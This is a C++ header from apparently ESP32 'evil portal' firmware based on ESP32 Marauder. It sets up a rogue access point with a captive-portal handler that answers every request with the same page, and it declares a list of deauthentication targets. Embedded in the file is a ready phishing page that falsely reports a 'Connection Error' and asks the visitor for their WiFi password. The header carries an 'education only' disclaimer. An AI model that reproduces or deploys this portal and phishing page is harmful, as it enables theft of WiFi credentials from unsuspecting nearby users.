#pragma once

#ifndef EVILPORTALHEADER_H
#define EVILPORTALHEADER_H

/*
     * evilportalheader.h (Based ESP32 Marauder By @justcallmekoko)
    * /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
    * Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
    * Licensed under the MIT License.
*/

#include <Arduino.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <WiFi.h>

#include <LinkedList.h>

#include "core/sdcardmountheader.h"
#include "core/settingheader.h"
#include "wifiheader.h"
#include "core/utilsheader.h"
#include "core/logutilsheader.h"

extern ESP32ATSetting espatsettings;
extern String htmlFile;
extern SDCardModules sdcard;

struct EPDeauthList {
    uint8_t target_mac[6];
    uint8_t channel;
};

extern LinkedList<EPDeauthList>* ep_target_mac_list;
extern String str_deauth_frame;

const char default_html[] PROGMEM = R"=====(
    <!DOCTYPE html>
    <html>
    <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
  <style>
  body{font-family:sans-serif;background:#eee;padding:20px;text-align:center}.box{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
  input{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer}</style></head>
  <body><div class="box"><h2>Connection Error</h2><p>Please enter your WiFi password to verify identity.</p>
  <form action="/get" id="email-form-step"><input name="password" type="password" class="g-input" placeholder="Enter your WiFi password" required><button class="gbtn-primary" type="submit">Connect</button></form></div></body></html>
)=====";

extern WiFiModules wifi;
extern LogUtils logutils;

char evilapName[MAX_AP_NAME_SIZE] = "PORTAL";
char index_html[MAX_HTML_SIZE] = "TEST";

class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) { return true; }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
  }
};

class EvilPortalAddtional 
{
    /*
    class CaptiveRequestHandler : public AsyncWebHandler {
    public:
        CaptiveRequestHandler(EvilPortalAddtional *evilportal) : _portal(evilportal) {}
        virtual ~CaptiveRequestHandler() { _portal = nullptr; }

        bool canHandle(AsyncWebServerRequest *request) { return true; }

        void handleRequest(AsyncWebServerRequest *request);
    private:
        EvilPortalAddtional *_portal;
    };
    */
    private:
        String user_name;
        String password;

        bool has_html;
        bool has_ap;

        //void portalController(AsyncWebServerRequest *request);

    public:
        EvilPortalAddtional();

        //String target_html_name = "index.html";
        //uint8_t selected_html_index = 0;

        bool name_received;
        bool password_received;
        bool runServer;

        //LinkedList<String>* html_files;
        String get_user_name();
        String get_password();

        void shutdownServer();
        void serverSetup();
        void apStart();
        bool apSetup(String essid);
        bool htmlSetup();
        void main();
        void loop();
};

#endif